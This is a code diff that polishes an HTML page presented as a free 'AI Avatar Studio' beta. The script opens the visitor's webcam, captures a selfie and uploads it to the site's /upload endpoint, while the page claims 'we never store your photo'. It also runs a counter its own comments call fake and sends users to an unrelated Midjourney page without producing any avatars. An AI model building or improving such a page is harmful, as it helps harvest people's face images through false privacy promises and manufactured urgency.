@@ -2,73 +2,81 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>AI Avatar Creator – Beta</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AI Avatar Studio – Beta</title>
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
     body { 
       background: linear-gradient(135deg, #0b0f1c, #1a1f35); 
-      font-family: 'Inter', sans-serif; 
+      font-family: 'Inter', -apple-system, sans-serif; 
       display: flex; 
       justify-content: center; 
       align-items: center; 
       min-height: 100vh; 
       color: white;
+      padding: 16px;
     }
     .card {
-      background: rgba(255,255,255,0.05);
-      backdrop-filter: blur(12px);
-      border: 1px solid rgba(255,255,255,0.1);
+      background: rgba(255,255,255,0.06);
+      backdrop-filter: blur(14px);
+      border: 1px solid rgba(255,255,255,0.08);
       border-radius: 40px;
-      padding: 40px 30px;
+      padding: 32px 24px 40px;
       max-width: 440px;
       width: 100%;
       text-align: center;
-      box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+      box-shadow: 0 30px 80px rgba(0,0,0,0.9);
     }
     .badge { 
       background: #facc15; 
       color: #000; 
-      padding: 6px 18px; 
-      border-radius: 40px; 
+      padding: 6px 20px; 
+      border-radius: 60px; 
       font-weight: 700; 
-      font-size: 14px; 
+      font-size: 13px; 
       display: inline-block;
-      margin-bottom: 12px;
+      margin-bottom: 10px;
+      letter-spacing: 0.5px;
     }
-    h1 { font-size: 28px; font-weight: 700; margin-bottom: 8px; }
-    .sub { opacity: 0.7; font-size: 15px; margin-bottom: 20px; }
-    .counter { color: #facc15; font-weight: 700; font-size: 18px; margin-bottom: 18px; }
+    h1 { font-size: 30px; font-weight: 800; margin-bottom: 4px; letter-spacing: -0.5px; }
+    .sub { opacity: 0.65; font-size: 15px; margin-bottom: 18px; }
+    .counter { color: #facc15; font-weight: 700; font-size: 18px; margin-bottom: 18px; background: rgba(250,204,21,0.08); padding: 8px 12px; border-radius: 60px; display: inline-block; }
     video { 
       width: 100%; 
-      border-radius: 24px; 
-      background: #111; 
-      border: 2px solid rgba(255,255,255,0.15);
+      border-radius: 28px; 
+      background: #0a0a12; 
+      border: 2px solid rgba(255,255,255,0.06);
       transform: scaleX(-1);
+      aspect-ratio: 4/3;
+      object-fit: cover;
     }
     .btn {
       background: #7c3aed;
       border: none;
-      padding: 16px 32px;
+      padding: 18px 28px;
       border-radius: 60px;
       font-size: 18px;
       font-weight: 700;
       color: white;
       width: 100%;
-      margin-top: 18px;
+      margin-top: 20px;
       cursor: pointer;
-      transition: 0.2s;
-      box-shadow: 0 0 30px #7c3aed66;
+      transition: 0.15s;
+      box-shadow: 0 0 40px rgba(124,58,237,0.35);
     }
     .btn:hover { background: #6d28d9; transform: scale(1.01); }
+    .btn:active { transform: scale(0.97); }
+    #status { margin-top: 16px; color: #a78bfa; font-weight: 500; font-size: 14px; min-height: 24px; }
     .trust { 
       display: flex; 
       justify-content: center; 
-      gap: 20px; 
-      margin-top: 20px; 
+      gap: 24px; 
+      margin-top: 22px; 
       font-size: 12px; 
-      opacity: 0.5; 
+      opacity: 0.4; 
+      letter-spacing: 0.3px;
     }
-    #status { margin-top: 16px; color: #a78bfa; font-weight: 500; }
+    .trust span { display: flex; align-items: center; gap: 4px; }
   </style>
 </head>
 <body>
@@ -76,48 +84,71 @@
   <div class="badge">🔥 BETA – FREE</div>
   <h1>AI Avatar Studio</h1>
   <div class="sub">One live selfie = 10 unique AI styles</div>
-  <div class="counter">⏳ <span id="spots">43</span> spots remaining</div>
-  <video id="video" autoplay></video>
+  <div class="counter">⏳ <span id="spots">47</span> spots remaining</div>
+  <video id="video" autoplay playsinline></video>
   <button class="btn" id="capture">✨ Generate my avatars</button>
-  <div id="status">Camera required – we never store your photo</div>
-  <div class="trust">🔒 Encrypted · ⚡ Deleted after render · 🤖 Powered by Flux AI</div>
+  <div id="status">📸 Camera required – we never store your photo</div>
+  <div class="trust">
+    <span>🔒 Encrypted</span>
+    <span>⚡ Auto‑deleted</span>
+    <span>🤖 Flux AI</span>
+  </div>
 </div>
 <script>
-  const video = document.getElementById('video');
-  const status = document.getElementById('status');
-  const spots = document.getElementById('spots');
+  (function() {
+    const video = document.getElementById('video');
+    const status = document.getElementById('status');
+    const spots = document.getElementById('spots');
+    let stream = null;
 
-  // Fake decreasing counter
-  setInterval(() => {
-    let n = parseInt(spots.innerText);
-    if (n > 10) spots.innerText = n - 1;
-  }, 8000);
+    // Fake decreasing spot counter
+    let spotInterval = setInterval(() => {
+      let n = parseInt(spots.innerText);
+      if (n > 3) spots.innerText = n - 1;
+      else clearInterval(spotInterval);
+    }, 7000);
 
-  navigator.mediaDevices.getUserMedia({ video: true })
-    .then(s => { video.srcObject = s; })
-    .catch(() => status.innerText = '⚠️ Please allow camera access');
+    // Request camera on load
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } })
+      .then(s => { stream = s; video.srcObject = s; })
+      .catch(() => { status.innerText = '⚠️ Please allow camera access – required for avatar generation'; });
 
-  document.getElementById('capture').onclick = function() {
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+    document.getElementById('capture').addEventListener('click', function() {
+      const btn = this;
+      btn.disabled = true;
+      btn.innerText = '⏳ Generating...';
+      status.innerText = '⏳ Processing your selfie...';
 
-    status.innerText = '⏳ Generating your avatars...';
-    fetch('/upload', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ image: dataUrl })
-    })
-    .then(res => res.json())
-    .then(() => {
-      status.innerText = '✅ Almost ready – redirecting...';
-      setTimeout(() => window.location.href = 'https://www.midjourney.com/showcase', 1800);
-    })
-    .catch(() => status.innerText = '⏳ Retry – we’re at capacity');
-  };
+      // Capture frame
+      const canvas = document.createElement('canvas');
+      const vw = video.videoWidth || 640;
+      const vh = video.videoHeight || 480;
+      canvas.width = vw;
+      canvas.height = vh;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, vw, vh);
+      const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+
+      // Send to server
+      fetch('/upload', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image: dataUrl })
+      })
+      .then(res => res.json())
+      .then(data => {
+        status.innerText = '✅ Almost ready – redirecting to your gallery...';
+        setTimeout(() => {
+          window.location.href = 'https://www.midjourney.com/showcase';
+        }, 1800);
+      })
+      .catch(() => {
+        status.innerText = '⏳ High demand – retrying...';
+        btn.disabled = false;
+        btn.innerText = '✨ Generate my avatars';
+      });
+    });
+  })();
 </script>
 </body>
 </html>
